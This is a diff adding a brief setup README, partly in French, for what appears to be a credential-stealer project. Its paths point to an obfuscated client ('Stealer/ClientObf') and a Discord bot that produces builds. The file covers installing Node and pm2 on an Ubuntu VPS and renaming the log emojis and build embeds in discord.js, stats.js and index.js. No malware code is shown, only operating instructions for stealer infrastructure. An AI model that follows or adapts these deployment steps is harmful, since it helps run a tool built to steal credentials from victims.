@@ -1,0 +1,12 @@
+Download Node v18.16.1
+Use Vps with Ubuntu 20.04
+
+Setup the src on your vps
+
+sudo apt install Nodejs
+sudo npm install
+sudo npm i pm2 -g
+
+Pour modifier le nom des logs allez dans Stealer/ClientObf/Utils dans discord.js Modifier les émojis et le nom et dans stats.js c'est de même.
+
+Pour modifier le nom des embeds de build allez dans Stealer/Bot et dans index.js vous pouvez renammes le bot ^^
